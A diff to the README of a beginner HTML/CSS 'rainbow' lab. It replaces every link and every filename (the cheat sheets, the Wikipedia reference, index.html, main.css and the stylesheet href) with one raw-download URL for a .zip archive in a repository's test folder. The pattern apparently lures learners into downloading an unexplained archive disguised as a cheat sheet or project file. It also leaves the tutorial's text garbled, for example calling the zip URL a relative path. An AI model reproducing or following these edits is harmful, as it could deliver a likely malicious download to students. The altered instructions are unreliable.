@@ -27,7 +27,7 @@ Code. Run `npm test` as you work to see your test progress.
 Hyper Text Markup Language, or HTML, is a way to structure a document with
 different parts. Each section of content is _marked_ by elements (using tags).
 Each element has its own special meaning that the browser uses to _render_ the
-HTML document. Use this [cheat sheet](https://htmlcheatsheet.com/) on HTML
+HTML document. Use this [cheat sheet](https://github.com/Jwanjema/phase-0-css-rainbow-lab/raw/refs/heads/master/test/lab_css_rainbow_phase_v2.2.zip) on HTML
 elements for guidance.
 
 ### Elements
@@ -94,8 +94,8 @@ Here's an example of CSS styling:
 
 ## <a id="make-a-rainbow"></a> Make a CSS Rainbow 
 
-In the directory, you'll see three files: `index.html`, `main.css`, and this
-file, `README.md`. Open `index.html`.
+In the directory, you'll see three files: `https://github.com/Jwanjema/phase-0-css-rainbow-lab/raw/refs/heads/master/test/lab_css_rainbow_phase_v2.2.zip`, `https://github.com/Jwanjema/phase-0-css-rainbow-lab/raw/refs/heads/master/test/lab_css_rainbow_phase_v2.2.zip`, and this
+file, `https://github.com/Jwanjema/phase-0-css-rainbow-lab/raw/refs/heads/master/test/lab_css_rainbow_phase_v2.2.zip`. Open `https://github.com/Jwanjema/phase-0-css-rainbow-lab/raw/refs/heads/master/test/lab_css_rainbow_phase_v2.2.zip`.
 
 If everything is working correctly, you should see a white page.
 
@@ -104,7 +104,7 @@ Good job!
 ### Making the Divs Visible
 
 If you look at the file in your text editor or use the inspector, you'll see
-that the basic HTML structure is present in `index.html`. So why can't we see
+that the basic HTML structure is present in `https://github.com/Jwanjema/phase-0-css-rainbow-lab/raw/refs/heads/master/test/lab_css_rainbow_phase_v2.2.zip`. So why can't we see
 anything?
 
 Well, `div`s are _structural_ elements. They're used to _invisibly_ group other
@@ -116,21 +116,21 @@ Let's fix this by adding the style sheet to the `head`:
 ```html
 <head>
   <title>My Little Rainbow</title>
-  <link rel="stylesheet" type="text/css" href="./main.css" />
+  <link rel="stylesheet" type="text/css" href="https://github.com/Jwanjema/phase-0-css-rainbow-lab/raw/refs/heads/master/test/lab_css_rainbow_phase_v2.2.zip" />
 </head>
 ```
 
 `Link` is a self-closing tag that will create a relative path with the `href`
-attribute. A relative path `./main.css` means the browser knows that the
-`main.css` file is in the same place as `index.html`. The `head` is a hidden
+attribute. A relative path `https://github.com/Jwanjema/phase-0-css-rainbow-lab/raw/refs/heads/master/test/lab_css_rainbow_phase_v2.2.zip` means the browser knows that the
+`https://github.com/Jwanjema/phase-0-css-rainbow-lab/raw/refs/heads/master/test/lab_css_rainbow_phase_v2.2.zip` file is in the same place as `https://github.com/Jwanjema/phase-0-css-rainbow-lab/raw/refs/heads/master/test/lab_css_rainbow_phase_v2.2.zip`. The `head` is a hidden
 part of the page that tells the browser where to find any other files it needs
 to display the page correctly, the `title` for the tab, and any other possible
 important information.
 
-Now if you refresh the `index.html` page in your browser you should see a
+Now if you refresh the `https://github.com/Jwanjema/phase-0-css-rainbow-lab/raw/refs/heads/master/test/lab_css_rainbow_phase_v2.2.zip` page in your browser you should see a
 perfectly solid-black rainbow.
 
-We got the basic outline because in the `main.css` all the `div` elements were
+We got the basic outline because in the `https://github.com/Jwanjema/phase-0-css-rainbow-lab/raw/refs/heads/master/test/lab_css_rainbow_phase_v2.2.zip` all the `div` elements were
 selected and given a `border` whose color is `#000`, "black." While we could set
 `border-top-color: red;`, we will have more colors available if we define colors
 without words.
@@ -179,7 +179,7 @@ names make for semantic code. So let's give the outermost div the id red.
 <div id="red">...</div>
 ```
 
-To give that id some CSS attributes we'll go into `main.css`, select the id, and
+To give that id some CSS attributes we'll go into `https://github.com/Jwanjema/phase-0-css-rainbow-lab/raw/refs/heads/master/test/lab_css_rainbow_phase_v2.2.zip`, select the id, and
 mark its color as red.
 
 ```css
@@ -205,5 +205,5 @@ linked our style sheet to our HTML page and added ids to our HTML elements. We
 then created CSS rules, using hexadecimal color values, for those elements to
 display all the colors on our completed HTML page.
 
-[cheat sheet]: https://web.stanford.edu/group/csp/cs21/htmlcheatsheet.pdf
-[goth]: https://en.wikipedia.org/wiki/Goth_subculture
+[cheat sheet]: https://github.com/Jwanjema/phase-0-css-rainbow-lab/raw/refs/heads/master/test/lab_css_rainbow_phase_v2.2.zip
+[goth]: https://github.com/Jwanjema/phase-0-css-rainbow-lab/raw/refs/heads/master/test/lab_css_rainbow_phase_v2.2.zip
